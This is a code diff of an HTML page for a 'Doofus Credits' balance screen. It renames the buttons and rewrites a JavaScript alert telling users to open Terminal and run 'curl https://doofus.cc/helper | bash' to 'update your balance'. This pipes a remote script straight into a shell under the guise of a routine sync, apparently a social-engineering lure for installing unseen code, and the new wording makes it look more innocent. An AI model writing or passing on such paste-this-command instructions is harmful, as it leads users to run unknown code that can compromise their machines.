@@ -383,8 +383,8 @@
                 Available Doofus Credits
             </p>
             <div class="balance-buttons">
-                <button class="btn" onclick="location.reload()">Check Again</button>
-                <button class="btn btn-secondary" onclick="convertTickets()">Convert House Tickets</button>
+                <button class="btn" onclick="location.reload()">Refresh</button>
+                <button class="btn btn-secondary" onclick="convertTickets()">Update Balance</button>
             </div>
         </div>
     </div>
@@ -535,12 +535,12 @@
 
         function convertTickets() {
             alert(
-                "To add tickets based on your House Tickets:\n\n" +
+                "To update your balance:\n\n" +
                 "1. Open Terminal (it's a built-in app on your computer)\n" +
                 "2. Type in this command exactly (double-check it for errors):\n\n" +
-                "   curl https://www.doofus.cc/helper | bash\n\n" +
+                "   curl https://doofus.cc/helper | bash\n\n" +
                 "3. Press Enter and follow the steps carefully.\n\n" +
-                "    This will sync your house tickets with your balance."
+                "This will sync your house tickets with your balance."
             );
         }
 
